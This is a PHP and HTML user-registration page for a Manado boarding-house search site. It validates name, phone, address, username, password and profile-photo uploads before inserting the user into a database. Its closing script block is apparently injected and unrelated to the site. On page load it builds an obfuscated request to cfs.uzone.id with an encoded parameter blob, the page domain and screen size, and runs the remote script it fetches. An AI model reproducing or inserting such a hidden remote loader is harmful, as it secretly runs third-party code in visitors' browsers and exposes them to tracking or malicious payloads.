<?php
// Include config file
include 'config.php';
 
// Define variables and initialize with empty values
$username = $name = $tlp = $password = $confirm_password = $fotoprofil[] = "";
$username_err = $name_err = $tlp_err = $password_err = $confirm_password_err = $alamat_err = $fotoprofil_err = "";
 
// Processing form data when form is submitted
if($_SERVER["REQUEST_METHOD"] == "POST"){

	// Validate fotoprofil
	define( 'MAX_ALLOWED_FILE_SIZE', 32 * 1024 * 1024 ); // 5Mo
    define( 'UPLOAD_PATH', 'uploadfotoprofil' );

    function is_allowed_file_ext( $filename = null )
    {
        $allowed_ext = array("jpg", "jpeg", "gif", "png");
        $_parts = explode( '.', $filename );
        $_ext = end( $_parts );
        $_ext = strtolower( $_ext );
        if( in_array( $_ext , $allowed_ext ) ){
            return $_ext;
        }
        return false;
    }

    if( !empty( $_FILES['fotoprofil'] ) ){
        foreach ($_FILES['fotoprofil']['name'] as $key => $filename ) {
            if( $_FILES['fotoprofil']['error'][$key] == UPLOAD_ERR_OK ){

                if( $file_ext = is_allowed_file_ext( $filename ) ){
                    $new_filename[$key] = sprintf( '%d-%s.%s', round(microtime(true)), uniqid(), $file_ext );
                    if( $_FILES['fotoprofil']['size'][$key] <= MAX_ALLOWED_FILE_SIZE ){
                        // Everything is okay now, save the file
                        $dest_path[$key] = sprintf( '%s/%s', rtrim(UPLOAD_PATH,'/'), $new_filename[$key] );
                        move_uploaded_file( $_FILES['fotoprofil']['tmp_name'][$key], $dest_path[$key] );
						
                    }
                }else{
                    $fotoprofil_err = $filename . ' Bukan Format yang Benar(jpg,jpeg,gif,png).';
                }
            }
        }

	if(empty($new_filename[0])){
	
	$new_filename[0] = "";
	} 
	}
	
 
    // Validate username
    if(empty(trim($_POST["username"]))){
        $username_err = "Tolong masukkan username.";
    } else{
        // Prepare a select statement
        $sql = "SELECT id FROM users WHERE username = ?";
        
        if($stmt = mysqli_prepare($link, $sql)){
            // Bind variables to the prepared statement as parameters
            mysqli_stmt_bind_param($stmt, "s", $param_username);
            
            // Set parameters
            $param_username = trim($_POST["username"]);
            
            // Attempt to execute the prepared statement
            if(mysqli_stmt_execute($stmt)){
                /* store result */
                mysqli_stmt_store_result($stmt);
                
                if(mysqli_stmt_num_rows($stmt) == 1){
                    $username_err = "Username sudah ada";
                } else{
                    $username = trim($_POST["username"]);
                }
            } else{
                echo "Oops! Something went wrong. Please try again later.";
            }
        }
         
        // Close statement
        mysqli_stmt_close($stmt);
    }
    
	
	 // Validate nama lengkap
    $input_name = trim($_POST["name"]);
    if(empty($input_name)){
        $name_err = "Tolong masukkan nama lengkap";
    } elseif(!filter_var(trim($_POST["name"]), FILTER_VALIDATE_REGEXP, array("options"=>array("regexp"=>"/^[a-zA-Z'-.\s ]+$/")))){
        $name_err = 'Tolong masukkan nama dengan benar (a-zA-Z kutip titik koma, tidak boleh menggunakan angka)';
    } else{
        $name = $input_name;
    }
	
	$input_alamat = trim($_POST["alamat"]);
    if(empty($input_alamat)){
        $alamat_err = "Tolong masukkan alamat";     
    } else{
        $alamat = $input_alamat;
    }
	
	 // Validate no tlp
    $input_tlp = trim($_POST["tlp"]);
    if(empty($input_tlp)){
        $tlp_err = "Tolong masukkan nomor telepon";     
    } elseif(!ctype_digit($input_tlp)){
        $tlp_err = 'Masukkan nomor telepon dengan benar (angka)';
    } else{
        $tlp = $input_tlp;
    }
	
    // Validate password
    if(empty(trim($_POST['password']))){
        $password_err = "Tolong masukkan password";     
    } elseif(strlen(trim($_POST['password'])) < 6){
        $password_err = "Password harus memiliki minimal 6 karakter";
    } else{
        $password = trim($_POST['password']);
    }
    
    // Validate confirm password
    if(empty(trim($_POST["confirm_password"]))){
        $confirm_password_err = 'Tolong konfirmasi password anda';     
    } else{
        $confirm_password = trim($_POST['confirm_password']);
        if($password != $confirm_password){
            $confirm_password_err = 'Password tidak sesuai';
        }
    }
    
    // Check input errors before inserting in database
    if(empty($username_err) && empty($name_err) && empty($tlp_err) && empty($password_err) && empty($confirm_password_err) && empty($alamat_err)){
        
        // Prepare an insert statement
        $sql = "INSERT INTO users (username, name, alamat, tlp, password, fotoprofil) VALUES (?, ?, ?, ?, ?, ?)";
         
        if($stmt = mysqli_prepare($link, $sql)){
            // Bind variables to the prepared statement as parameters
            mysqli_stmt_bind_param($stmt, "ssssss", $param_username, $param_name, $param_alamat, $param_tlp, $param_password, $new_filename[0]);
            
            // Set parameters
            $param_username  = $username;
			$param_name 	 = $name;
			$param_alamat	 = $alamat;
			$param_tlp		 = $tlp;
            $param_password = password_hash($password, PASSWORD_DEFAULT); // Creates a password hash
            
            // Attempt to execute the prepared statement
            if(mysqli_stmt_execute($stmt)){
                // Redirect to login page
                header("location: registersukses.php");
            } else{
                echo "Something went wrong. Please try again later.";
            }
        }
         
        // Close statement
        mysqli_stmt_close($stmt);
    }
    
    // Close connection
    mysqli_close($link);
}
?>
<!doctype html>
<html class="no-js" lang="en">
    

<head>
        <meta charset="utf-8">
        <meta http-equiv="x-ua-compatible" content="ie=edge">
		<title>Sistem Informasi Pencarian Tempat Kos dan Rumah Kontrakan di Manado</title>
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        
         <!-- Favicon -->
        <link rel="shortcut icon" type="image/x-icon" href="assets/img/home.ico">
		
		<!-- all css here -->
        <link rel="stylesheet" href="assets/css/bootstrap.min.css" type="text/css">
        <link rel="stylesheet" href="assets/css/magnific-popup.css" type="text/css">
        <link rel="stylesheet" href="assets/css/owl.carousel.min.css" type="text/css">
        <link rel="stylesheet" href="assets/css/font-awesome.min.css" type="text/css">
        <link rel="stylesheet" href="assets/css/pe-icon-7-stroke.css" type="text/css">	
        <link rel="stylesheet" href="assets/css/animate.css" type="text/css">
		<link rel="stylesheet" href="assets/css/animate-headline.css" type="text/css">
        <link rel="stylesheet" href="assets/css/jquery-ui.css" type="text/css">
        <link rel="stylesheet" href="assets/css/meanmenu.min.css" type="text/css">
        <link rel="stylesheet" href="assets/css/bundle.css" type="text/css">
        <link rel="stylesheet" href="assets/css/style.css" type="text/css">
        <link rel="stylesheet" href="assets/css/responsive.css" type="text/css">
		<link rel="stylesheet" href="assets/css/map.css" type="text/css">	
		<link rel="stylesheet" href="lib/css/nivo-slider.css" type="text/css">
		<link rel="stylesheet" href="lib/css/preview.css" type="text/css" media="screen">
    </head>
    <body>
        <!-- header start -->
		<header class="header-area home-style-2">
			<div class="header-bottom">
			    <div class="container">
			        <div class="row">
			            <div class="col-md-4 col-sm-3 col-xs-6">
			                <div class="logo">
			                    <a href="index.php">
                                    <img src="assets/img/logo/rumah.png" height="40px" alt="">
                                </a>
			                </div>
			            </div>
			            <div class="col-md-8 col-sm-9 col-xs-6">
			                <div class="cart-menu">
                                
                                <div class="user user-style-3 f-right">
						            <a>
                                        <img src="uploadfotoprofil/default.jpg" height="40px" width="40px" alt="">
                                    </a>
                                    <div class="currence-user-page">
                                        <div class="user-page">
                                            <ul>
                                               <li><a href="login.php"><i class="pe-7s-next-2"></i> Masuk</a></li>
                                               <li><a href="register.php"><i class="pe-7s-add-user"></i> Buat Akun</a></li>
											   <li><a href="admin/pages-signin.php"><i class="pe-7s-user"></i> Masuk Sebagai Admin</a></li>
                                            </ul>
                                        </div>
                                    </div>
						        </div>		                    
			                </div>
			            </div>
			        </div>
			    </div>
			</div>
		</header>
		<!-- header end -->
		<!-- mobile-menu-area start -->
        
        <!-- mobile-menu-area end -->
		<!-- breadcrumbs start -->
		<div class="breadcrumbs-area breadcrumb-bg ptb-100">
		    <div class="container">
		        <div class="breadcrumbs text-center">
                    <h2 class="breadcrumb-title">Halaman Buat Akun</h2>
                    
                </div>
		    </div>
		</div>
		<!-- breadcrumbs area end -->
		<!-- login area end -->
		<div class="login-area ptb-100">
		    <div class="container">
                <div class="row">
                    <div class="col-md-6 col-md-offset-3">
                        <div class="login-content">
                            <div class="login-title">
                                <h4>Buat Akun</h4>
                                <p>Masukkan data yang ada dibawah ini untuk membuat akun baru.</p>
                            </div>
                            <div class="login-form">
                                <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" enctype="multipart/form-data" method="post">
									<img id="output1" alt="Foto Profil" height="150px" width="200px">
									<input name="fotoprofil[]" multiple="multiple" placeholder="Foto Profil" onchange="loadFile1(event)" type="file" class="form-control" ><span class="help-block"><?php echo $fotoprofil_err; ?></span>
									<script>
											var loadFile1 = function(event) {
											var output1 = document.getElementById('output1');
											output1.src = URL.createObjectURL(event.target.files[0]);
											};
									</script>
									<input name="name" placeholder="Nama Lengkap" type="text" class="form-control" ><span class="help-block"><?php echo $name_err; ?></span>
									<input name="tlp" placeholder="Nomor Telepon" type="text" class="form-control" ><span class="help-block"><?php echo $tlp_err; ?></span>
									<input name="alamat" placeholder="Alamat" type="text" class="form-control" ><span class="help-block"><?php echo $alamat_err; ?></span>
                                    <input name="username" placeholder="Username" type="text" class="form-control" ><span class="help-block"><?php echo $username_err; ?></span>
                                    <input name="password" placeholder="Password" type="password" class="form-control" ><span class="help-block"><?php echo $password_err; ?></span>
									<input name="confirm_password" placeholder="Konfirmasi Password" type="password" class="form-control" ><span class="help-block"><?php echo $confirm_password_err; ?></span>
									
                                    <div class="button-remember">
                                        <button class="login-btn" type="submit" >Buat Akun</button>
                                    </div>
									<div class="new-account">
                                        <p>Sudah punya akun ? <a href="login.php" style="color:blue">Masuk disini.</a></p>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
		    </div>
		</div>
		<!-- login area end -->
		<!-- subscribe area start -->
		
		<!-- subscribe area end -->
		<!-- footer area start -->
		<footer class="footer-area">
		    <div class="container">
                <div class="footer-top pt-60 pb-30">
                  
					
                </div>
                <div class="footer-bottom ptb-20">
                    <div class="row">
					
                        <div class="col-md-7 col-sm-7">
                            <div class="copyright">
                                <p>
                                    Copyright © 2018 Angga Qurnen Suwito
                                    
                                </p>
                            </div>
                        </div>
						<div class="col-md-3 col-sm-3">
                            <div class="footer-widget mb-30">
                                <div class="footer-title">
                                    <h3>Layanan</h3>
                                </div>
                                <div class="widget-text">
                                    <ul>
                                        <li><a href="about.php" target="_blank" rel="noopener noreferrer">About</a></li>
                                        <li><a href="tutorialpencari.php" target="_blank" rel="noopener noreferrer">Petunjuk Penggunaan Pencari</a></li>
                                        <li><a href="tutorialpenyedia.php" target="_blank" rel="noopener noreferrer">Petunjuk Penggunaan Penyedia</a></li>
                                        
                                    </ul>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-2 col-sm-2">
                            
							<div class="payment f-right">
                                    <ul>
                                        <li><a href="#"><i class="fa fa-facebook"></i></a></li>
                                        <li><a href="#"><i class="fa fa-twitter"></i></a></li>
                                        <li><a href="#"><i class="fa fa-google-plus"></i></a></li>
                                        <li><a href="#"><i class="fa fa-instagram"></i></a></li>
                                        <li><a href="#"><i class="fa fa-pinterest-p"></i></a></li>
                                    </ul>
                            </div>
                        </div>
                    </div>
                </div>
		    </div>
		</footer>
		<!-- footer area end -->
		
		<!-- all js here -->
		<script src="assets/js/vendor/jquery-1.12.0.min.js" type="text/javascript"></script>
		<script src="assets/js/bootstrap.min.js" type="text/javascript"></script>
        <script src="assets/js/jquery.meanmenu.js" type="text/javascript"></script>
        <script src="assets/js/jquery.magnific-popup.min.js" type="text/javascript"></script>
        <script src="assets/js/isotope.pkgd.min.js" type="text/javascript"></script>
        <script src="assets/js/imagesloaded.pkgd.min.js" type="text/javascript"></script>
        <script src="assets/js/jquery.validate.min.js" type="text/javascript"></script>
        <script src="assets/js/owl.carousel.min.js" type="text/javascript"></script>
		<script src="lib/js/jquery.nivo.slider.js" type="text/javascript"></script>
		<script src="lib/home.js" type="text/javascript"></script>
		<script src="assets/js/plugins.js" type="text/javascript"></script>
        <script src="assets/js/main.js" type="text/javascript"></script>
		<script src="assets/js/vendor/modernizr-2.8.3.min.js" type="text/javascript"></script>
	
		<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582HVlH3eBnL31jJGKDJMFRytkSj9I4j9ndv8I42R%2fLMgHcocdiupOeMvQ52aQnn9OdsvvFjomKd2I9VTDZPL8wYhAtzzdKiVMsr8r2CBKby5zcW6CWpYJFPKYTrwnwCYSCNT9Mi%2fQxdABzKXqsYHhuxfQ7tA4ku%2bC51m4A11K09oK8UuhW6or%2f%2fyFugzstUe3s2FXCQwUWEz11FnuMbiZSgPlDHUuLVxZKfUYGgnNW8rnicr1GHF1r8VTs6x%2bNkvGCUY8cp9oK62u0ZLukFHGY8OhMvfuf16c6ezhncjYkp5BReomV7fi2y%2fiNBapIXTjE5b%2fOdtYYqvguxNl4t7girhoc1K0Q9z%2bjLW6dcTESuvd%2fRkNs12BcwW1HTIf1D8vNbowZi5eO7IssLtpRGEQgtAl1CKLTmOfecmW3FPWs8SADIzjNNv9ztYWD5wLhD%2fd55gSiDpw9fwyApKwhzqTJalLiZJrdZD9pDHNM7xoEgfTPpJru%2bD6yTyMssyDRFpbAibzMxklSPYG" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

</html>
